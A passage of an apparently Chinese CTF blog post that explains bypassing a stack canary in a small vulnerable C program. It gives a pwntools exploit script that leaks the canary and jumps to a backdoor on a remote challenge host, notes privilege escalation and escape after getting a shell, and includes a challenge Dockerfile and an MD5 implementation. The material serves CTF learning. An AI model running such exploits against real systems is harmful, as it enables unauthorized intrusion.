class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello, %s. Introduce yourself: &quot;</span>, buf);</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Bye.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>好,现在我来讲解为什么我们需要绕过Canary:<br>我们构造栈溢出的本质是劫持 <em>main</em> 函数让地址最终指向我们想要的地址.<br>而Canary也是在main函数结束的地点进行一次检查.所以在前期我们可以肆意RE,只要最后把Canary的值搞到,最后交代上去,就不会有人发现.<br>所以我们第一次可以询问一个刚好RE的值盖住Canary的最低位,最后补齐即可.脚本:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;202.198.27.90&#x27;</span>,<span class="number">40164</span>)  <span class="comment"># 打远程时替换</span></span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x40123b</span></span><br><span class="line">ret_addr = <span class="number">0x40123a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">265</span></span><br><span class="line">p.send(payload1)  <span class="comment"># 不用换行，读满 256</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello, &#x27;</span>)</span><br><span class="line">res=p.recvuntil(<span class="string">b&#x27;. Introduce yourself:&#x27;</span>)</span><br><span class="line">rres=<span class="built_in">bytes</span>(<span class="number">1</span>)+res[<span class="number">265</span>:<span class="number">272</span>]</span><br><span class="line"><span class="built_in">print</span>(rres)</span><br><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*<span class="number">264</span>+rres+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(backdoor_addr)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Ex-拿到靶机的sh之后我们能干什么呢"><a href="#Ex-拿到靶机的sh之后我们能干什么呢" class="headerlink" title="Ex. 拿到靶机的sh之后我们能干什么呢?"></a>Ex. 拿到靶机的sh之后我们能干什么呢?</h2><ol>
<li><p>获取flag.</p>
</li>
<li><p>尝试提权(root),然后尝试逃逸</p>
</li>
</ol>
<h1 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h1><p>不太会用docker自己造密码题,只好借鉴一下别人的是怎么写的</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a><a target="_blank" rel="noopener" href="https://ctf.cnsc.com.vn/">1</a></h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update -q \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -q -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">        build-essential \</span></span><br><span class="line"><span class="language-bash">        libssl-dev \</span></span><br><span class="line"><span class="language-bash">        socat \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m signing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/signing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src/ .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -o chall chall.c rsa.c prime.c base85.c -lcrypto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:signing /home/signing \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> -R 750 /home/signing \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> 740 flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> socat -T 60 -d -d TCP-LISTEN:1337,reuseaddr,fork EXEC:<span class="string">&#x27;./chall&#x27;</span></span></span><br></pre></td></tr></table></figure>
<h1 id="CTF板子"><a href="#CTF板子" class="headerlink" title="CTF板子"></a>CTF板子</h1><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> MD5 &#123;</span><br><span class="line">    <span class="comment">// 常量定义 - MD5算法的标准常量</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Constants</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 每次处理的数据块大小（字节）</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">size_t</span> BLOCK_SIZE;</span><br><span class="line">        <span class="comment">// MD5初始状态（小端序）</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_A;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_B;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_C;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_D;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 正弦函数的整数部分，用于每轮运算</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; K;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 每轮左循环移位的位数</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; S;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在类外定义静态常量成员</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> Constants::BLOCK_SIZE = <span class="number">64</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_A = <span class="number">0x67452301</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_B = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_C = <span class="number">0x98BADCFE</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_D = <span class="number">0x10325476</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; Constants::K = &#123;</span><br><span class="line">        <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>,</span><br><span class="line">        <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,</span><br><span class="line">        <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>,</span><br><span class="line">        <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,</span><br><span class="line">        <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>,</span><br><span class="line">        <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,</span><br><span class="line">        <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>,</span><br><span class="line">        <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>,</span><br><span class="line">        <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>,</span><br><span class="line">        <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>,</span><br><span class="line">        <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span>,</span><br><span class="line">        <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>,</span><br><span class="line">        <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>,</span><br><span class="line">        <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>,</span><br><span class="line">        <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>,</span><br><span class="line">        <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; Constants::S = &#123;</span><br><span class="line">        <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 辅助函数：左旋转</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">left_rotate</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 辅助函数：字节顺序转换（小端序）</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">to_little_endian</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((x &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">8</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// MD5算法核心的四个非线性函数（F, G, H, I）</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">F</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">G</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &amp; z) | (y &amp; ~z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">H</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x ^ y ^ z;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">I</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y ^ (x | ~z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理单个64字节数据块</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">process_block</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* block, <span class="type">uint32_t</span>&amp; a, <span class="type">uint32_t</span>&amp; b, <span class="type">uint32_t</span>&amp; c, <span class="type">uint32_t</span>&amp; d)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将64字节块转换为16个32位字</span></span><br><span class="line">        <span class="type">uint32_t</span> M[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            M[i] = (block[i * <span class="number">4</span>]) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 保存初始哈希值</span></span><br><span class="line">        <span class="type">uint32_t</span> AA = a;</span><br><span class="line">        <span class="type">uint32_t</span> BB = b;</span><br><span class="line">        <span class="type">uint32_t</span> CC = c;</span><br><span class="line">        <span class="type">uint32_t</span> DD = d;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第一轮：F函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">F</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = i;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第二轮：G函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">16</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">G</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第三轮：H函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">32</span>; i &lt; <span class="number">48</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">H</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第四轮：I函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">48</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">I</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">7</span> * i) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 加到原来的结果上</span></span><br><span class="line">        a += AA;</span><br><span class="line">        b += BB;</span><br><span class="line">        c += CC;</span><br><span class="line">        d += DD;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将32位整数转换为16进制字符串</span></span><br><span class="line">    <span class="function"><span class="type">static</span> std::string <span class="title">uint32_to_hex</span><span class="params">(<span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">        std::stringstream ss;</span><br><span class="line">        ss &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="comment">// MD5输出是小端序，但十六进制字符串通常显示为大端序</span></span><br><span class="line">        <span class="comment">// 所以需要调整字节顺序</span></span><br><span class="line">        value = <span class="built_in">to_little_endian</span>(value);</span><br><span class="line">        ss &lt;&lt; value;</span><br><span class="line">        <span class="keyword">return</span> ss.<span class="built_in">str</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 主要的MD5加密函数</span></span><br><span class="line">    <span class="function">std::string <span class="title">encrypt</span><span class="params">(<span class="type">const</span> std::string&amp; input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化MD5缓冲区（小端序）</span></span><br><span class="line">        <span class="type">uint32_t</span> a = Constants::INIT_A;</span><br><span class="line">        <span class="type">uint32_t</span> b = Constants::INIT_B;</span><br><span class="line">        <span class="type">uint32_t</span> c = Constants::INIT_C;</span><br><span class="line">        <span class="type">uint32_t</span> d = Constants::INIT_D;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 原始消息长度（字节）</span></span><br><span class="line">        <span class="type">uint64_t</span> original_length = input.<span class="built_in">length</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算填充后的长度</span></span><br><span class="line">        <span class="comment">// 消息需要填充到 448 mod 512 位（56 mod 64 字节）</span></span><br><span class="line">        <span class="type">size_t</span> padded_length = ((original_length + <span class="number">8</span>) / <span class="number">64</span> + <span class="number">1</span>) * <span class="number">64</span>;</span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">padded_message</span><span class="params">(padded_length, <span class="number">0</span>)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 复制原始消息</span></span><br><span class="line">        std::<span class="built_in">copy</span>(input.<span class="built_in">begin</span>(), input.<span class="built_in">end</span>(), padded_message.<span class="built_in">begin</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加填充位：1个1后面跟0，直到满足条件</span></span><br><span class="line">        padded_message[original_length] = <span class="number">0x80</span>; <span class="comment">// 二进制: 10000000</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加原始消息长度（以位为单位，小端序）</span></span><br><span class="line">        <span class="type">uint64_t</span> bit_length = original_length * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">            padded_message[padded_length - <span class="number">8</span> + i] = <span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(bit_length &gt;&gt; (i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理每个64字节块</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; padded_length; i += Constants::BLOCK_SIZE) &#123;</span><br><span class="line">            <span class="built_in">process_block</span>(&amp;padded_message[i], a, b, c, d);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将最终哈希值转换为十六进制字符串</span></span><br><span class="line">        std::string result = </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(a) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(b) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(c) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(d);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>
<script src="https://giscus.app/client.js"
        data-repo="NaraFluorine/NaraFluorine.github.io"
        data-repo-id="R_kgDONrzj3A"
        data-category="Announcements"
        data-category-id="DIC_kwDONrzj3M4C02ef"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="noborder_dark"
        data-lang="zh-CN"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/categories/">分类</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/friends/">友链</a></li>
        
          <li><a href="/QSL/">QSL</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
